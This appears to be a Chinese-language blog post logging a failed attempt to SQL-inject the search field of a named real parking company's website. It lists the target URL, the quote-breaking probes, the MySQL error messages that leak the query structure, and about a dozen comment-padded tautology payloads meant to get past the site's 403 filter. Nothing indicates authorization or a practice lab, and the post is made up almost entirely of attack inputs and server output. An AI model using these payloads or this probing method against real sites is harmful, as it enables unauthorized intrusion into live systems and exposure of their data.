---
title: SQL Injection inan Failed
description: SQL Injection inan Failed
last_update:
  date: "2025-08-27T08:00:00+08:00"
---

## 前言

- 目標: https://www.inan-parking.com.tw/search.php?keyword=
- Forbidden 大概三次就會鎖 IP，看來是場硬仗

## 測試流程

1. `keyword=%27`

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' or a.ServiceTel like '%'%' or a.ServiceAddr like '%'%')' at line 1
```

2. Forbidden Payloads

```
keyword=%%27)--%20123
keyword=%%27)--
keyword=%27/**/OR/**/%27%%27=%27
keyword='/**/OR/**/'tel%'='tel
keyword='--
keyword='/**/%26%26/**/'h%'='h%
keyword='/**/%7C%7C/**/'h%'='h%
keyword='/**/||/**/'h%'='h%
keyword='/**/+/**/'h%'='h%
keyword='/**/IN/**/(SELECT/**/'h')/**/
keyword=%27/**/XOR/**/%27h%%27=%27h%
```

```
Forbidden
You don't have permission to access this resource.

Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.
```

3. `keyword=%%27)`

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%')%' or a.ServiceAddr like '%%')%')' at line 1
```

4. `keyword='/**/OR`

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' or a.ServiceTel like '%'/**/OR%' or a.ServiceAddr like  '%'/**/OR%')' at line 1
```

5. `keyword='/**/OR/**/`

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' or a.ServiceTel like '%'/**/OR/**/%' or a.ServiceAddr like  '%'/**/OR/**/%')' at line 1
```

6. `keyword='/**/AND/**/`

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' or a.ServiceTel like '%'/**/AND/**/%' or a.ServiceAddr like  '%'/**/AND/**/%'' at line 1
```
